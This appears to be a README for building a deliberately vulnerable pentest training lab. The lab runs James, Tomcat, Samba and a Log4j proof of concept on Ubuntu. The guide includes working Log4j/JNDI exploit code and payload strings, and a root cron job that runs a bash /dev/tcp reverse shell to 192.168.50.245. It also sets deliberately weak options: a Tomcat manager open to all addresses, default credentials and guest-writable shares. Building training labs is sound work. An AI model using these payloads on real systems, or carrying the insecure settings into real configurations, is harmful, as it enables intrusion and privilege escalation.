
# Vulnerable servers

You can use this script and the configurations that follow to create vulnerable lab for network pentest training on Ubuntu

The script will install the following:

- James-2.3.2 vulnerable server with smtp
- Apache-tomcat
- Samba
- Log4j PoC

## Platform
- Install VM Player on Windows or Parrallel Desktop on Mac
- Install Ubuntu
- Create a script.sh file on the Ubuntu VM
- Clone the repository
- Run the chmod +x script.sh
- ./script.sh and follow the instructions

## Misconfigurations
- Misconfigured crontab file
- SSH key with weak password
- Make manager interface of apache-tomcat public

## Docker version of the lab 
- docker run --network host iconx2020a/vuln:tomcatamd
- docker run --network host iconx2020a/vuln:log4j
- docker run --network host iconx2020a/vuln:log4jpayloadlinux
- OR use the docker-compose.yml file to run the two log4j images (if you like)
- docker run --network host iconx2020a/vuln:james (doesnt work well)
# Configuration
The script will configure all the files below already. Just verify if individual files have the right content.


## Configure the James Server Phonix.sh script 
```
export JAVA_HOME="/usr/lib/jvm/java-8-openjdk-armd64"
export JAVA_HOME
PATH=$PATH:$JAVA_HOME/bin
export PATH
Or copy the above command to you .profile file run source .profile
Run echo $PATH to ensure that JAVA_HOME is part of the path.

cd /opt/james-2.3.2/bin
open the phonix.sh file and set the JAVA_HOME:

...
JAVA_HOME="/usr/lib/jvm/java-8-openjdk-armd64"
usage()
{
    echo "Usage: $0 {start|stop|run|restart|check}"
    exit 1
}
…
```
### Create Start James server Script with the name startjamesserver.sh
```
#startjamesserver.sh
#!/bin/bash
cd /opt/james-2.3.2/bin
echo "apache james server started"
sudo ./run.sh
```
### Run 

chmod + startjamesserver.sh

./startjamesserver.sh to start the server.

## Apache Tomcat Configuration
Open the tomcat-users.xml in the /opt/apache-tomcat-xxx/conf

Modify the manager section of the tomcat-users.xml file as follows:
 
```
<role rolename="manager-gui"/>
<user username="tomcat" password="tomcat" roles="manager-gui"/>


…
<!--
  <role rolename="tomcat"/>
  <role rolename="role1"/>
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
  <user username="role1" password="<must-be-changed>" roles="role1"/>
-->

```


### Configure apache-tomcat Listening port
Go to / opt/apache-tomcat-xxx/conf/server.xml and change the listening port from 8080 t0 8081 to avoid conflict with log4j port. 

Change **Connector port="8080"** to  **Connector port="8081"**

```
<!-- A "Connector" represents an endpoint by which requests are received
         and responses are returned. Documentation at :
         Java HTTP Connector: /docs/config/http.html
         Java AJP  Connector: /docs/config/ajp.html
         APR (HTTP/AJP) Connector: /docs/apr.html
         Define a non-SSL/TLS HTTP/1.1 Connector on port 8080
    -->
    <Connector port="8081" protocol="HTTP/1.1"
               connectionTimeout="20000"
               redirectPort="8443" />
    <!-- A "Connector" using the shared thread pool-->
    <!--
    <Connector executor="tomcatThreadPool"
               port="8080" protocol="HTTP/1.1"
               connectionTimeout="20000"
               redirectPort="8443" />
    -->
```
### Configure remote host access
Create the folder or file Catalina/localhost/manager.xml if they don´t exist
```
sudo nano ${CATLINA_HOME}/conf/Catalina/localhost/manager.xml 
#file should look like this
	
<Context privileged="true" antiResourceLocking="false" 
         docBase="{catalina.home}/webapps/manager">
    <Valve className="org.apache.catalina.valves.RemoteAddrValve" allow="^.*$" />
</Context>
```
### Start apache with script name startapache.sh
```
#!/bin/bash
cd /opt/tomcat/apache-tomcat-9.0.68/bin
./startup.sh

chmod +x startapache.sh
sudo ./startapache.sh
```

## Log4j PoC

Modify the poc.py file to point to the JAVA_HOME as follows:
```
…
#!/usr/bin/env python3
    try:
        p.write_text(program)
        subprocess.run([os.path.join(CUR_FOLDER, "/usr/lib/jvm/java-8-openjdk-armd64/bin/javac"), str(p)])
    except OSError as e:
        print(Fore.RED + f'[-] Something went wrong {e}')
        raise e
    else:
        print(Fore.GREEN + '[+] Exploit java class created success')
def payload(userip: str, webport: int, lport: int) -> None:
    generate_payload(userip, lport)
    print(Fore.GREEN + '[+] Setting up LDAP server\n')
    # create the LDAP server on new thread
    t1 = threading.Thread(target=ldap_server, args=(userip, webport))
    t1.start()
    # start the web server
    print(f"[+] Starting Webserver on port {webport} http://0.0.0.0:{webport}")
    httpd = HTTPServer(('0.0.0.0', webport), SimpleHTTPRequestHandler)
    httpd.serve_forever()
def check_java() -> bool:
    exit_code = subprocess.call([
        os.path.join(CUR_FOLDER, '/usr/lib/jvm/java-8-openjdk-armd64/bin/java'),
        '-version',
    ], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    return exit_code == 0
    
def ldap_server(userip: str, lport: int) -> None:
    sendme = "${jndi:ldap://%s:1389/a}" % (userip)
    print(Fore.GREEN + f"[+] Send me: {sendme}\n")
    url = "http://{}:{}/#Exploit".format(userip, lport)
    subprocess.run([
        os.path.join(CUR_FOLDER, "/usr/lib/jvm/java-8-openjdk-armd64/bin/java"),
        "-cp",
        os.path.join(CUR_FOLDER, "target/marshalsec-0.0.3-SNAPSHOT-all.jar"),
        "marshalsec.jndi.LDAPRefServer",
        url,
    ])
…
```

Run the payload generator to generate payload script

```
#generatelog4jpayload.sh
#!/bin/bash
echo "site runs at port 8080"
cd ~/mylog4j/log4j-shell-poc
python3 poc.py --userip localhost --webport 8000 --lport 9001
chmod +x generatelog4jpayload.sh
./generatelog4jpayload.sh
```
Where generatelog4jpayload.sh is the name of the script above.

### Start reverse shell listerner

nc -lvnp 9001

### Build the docker image
```
#!/bin/bash
cd ~/mylog4j/log4j-shell-poc
docker build -t log4j-shell-poc .
```
Run 
```
sudo docker build -t log4j-shell-poc .
if you have not restarted you machine after docker installation
```
### Run docker website
```
docker run --network host log4j-shell-poc
```
Once it is running, you can access it on localhost:8080

Copy the payload ${jndi:ldap://localhost:1389/a} and paste it in the username field of the vulnerable site. Click on the Login button to pop a shell.

## Samba config
### Create Users password
```
sudo adduser username
sudo smbpasswd -a username
```
### Configure the Samba users in the smb.conf file as follows:

```
sudo nano /etc/samba/smb.conf

#======================= Global Settings =======================

[global]

#just addedd
#client min protocol = SMB2
#client max protocol = SMB3
## Browsing/Identification ###
# Change this to the workgroup/NT-domain name your Samba server will part of
   workgroup = WORKGROUP
[Anonymous]
# comment = YOUR COMMENTS
 path = /samba/anonymous
 public = yes
 guest only = yes
 browsable = yes
 force create mode = 0666
 force directory mode = 0777
 writable = yes
 guest ok = yes
 read only = no
 force user = nobody
[Alice]
    path = /samba/alice
    browseable = yes
    valid users = @smbgrp
    read only = no
    force create mode = 0660
    force directory mode = 2770
    valid users = @sambashare @sadmin
[josh]
    path = /samba/josh
    browseable = yes
    valid users = @smbgrp
    read only = no
    force create mode = 0660
    force directory mode = 2770
    valid users = josh @sadmin
[James]
    path = /samba/james
    browseable = no
    valid users = @smbgrp
    read only = yes
    force create mode = 0660
    force directory mode = 2770
    valid users = james @sadmin
```
### Restart
sudo systemctl restart smbd

## Crontab configuration
Go to sudo nano /etc/crontab

Edit the cron job file as below:
```
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.
SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
PATH=/home/oslomet:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
*  *   * * *    root    backup.sh
*  *   * * *    root   reverse.sh
*  *   * * *    root    script.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```
### backup.sh script

```
#!/bin/bash
#chmod +s /bin/bash
# bash -i   >&  /dev/tcp/192.168.50.245/1234  0  >&1
#nc 192.168.50.234 1234
```
### reverse.sh
```
#!/bin/bash
#bash -i     >&  /dev/tcp/192.168.50.245/1234  0  >&1
#bash -i  >&  /dev/tcp/192.168.50.245/1234  0  >&1 
bash -c  "bash -i >& /dev/tcp/192.168.50.245/1234 0>&1"
```
## SSH
* Login to your server
* Create ssh key with ssh-keygen
* Add password (not passphrase) from the 10-million-password-list-top-100.txt from [here](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-100.txt) to the key when asked for passphrase.
* Accept the default for the rest of the settings
* Create the authorized_keys file in the .ssh folder if it does not exist
* cat .ssh/id_rsa.pub >> ~/.ssh/authorized_keys
* On your Kali Linux generate ssh keys and transfer the public key to the server with the scp command.
* Add the key to the authorized_keys so that you can authenticate with ssh keys
* Go to the ssh configuration file
* Allow public key authentication
* Disable password authentication
* sudo systemctl restart ssh
* Login from your kali linux with your ssh key
* Once it works go back to the server and enable password authentication
* sudo systemctl restart ssh
* Login to the server again with your key
* Login as one of the samba users
* sudo su josh
* Create a flag in the file.

# References
* https://github.com/kozmer/log4j-shell-poc
* https://phoenixnap.com/kb/ubuntu-samba
* https://crimsonglow.ca/~kjiwa/2016/06/exploiting-apache-james-2.3.2.html
* https://www.digitalocean.com/community/tutorials/how-to-configure-ssh-key-based-authentication-on-a-linux-server
* https://www.digitalocean.com/community/tutorials/how-to-install-and-use-docker-on-debian-9

